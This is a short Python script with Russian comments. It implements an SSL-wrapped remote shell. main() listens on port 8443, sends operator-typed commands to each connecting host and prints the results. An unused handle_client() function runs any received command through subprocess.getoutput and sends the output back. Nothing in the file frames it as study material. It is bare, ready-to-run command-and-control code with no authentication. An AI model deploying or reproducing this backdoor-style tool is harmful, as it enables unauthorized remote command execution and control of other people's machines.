import socket
import ssl
import subprocess


def handle_client(client_socket):
    while True:
        command = client_socket.recv(1024).decode()
        if not command:
            break
        result = subprocess.getoutput(command)
        client_socket.send(result.encode())

    client_socket.close()


def main():
    # Создание SSL контекста
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile='server_cert.pem', keyfile='server_key.pem')

    # Создание сокета
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 8443))
    server_socket.listen(5)

    print('Сервер слушает...')

    while True:
        client_socket, addr = server_socket.accept()
        print(f'Подключено: {addr}')

        # Оборачивание сокета в SSL
        ssl_client_socket = context.wrap_socket(client_socket, server_side=True)

        while True:
            command = input('Введите команду: ')
            if command.lower() == 'exit':
                break

            ssl_client_socket.send(command.encode())
            result = ssl_client_socket.recv(4096).decode()
            print(result)

        ssl_client_socket.close()
        print(f'Отключено: {addr}')


if __name__ == '__main__':
    main()
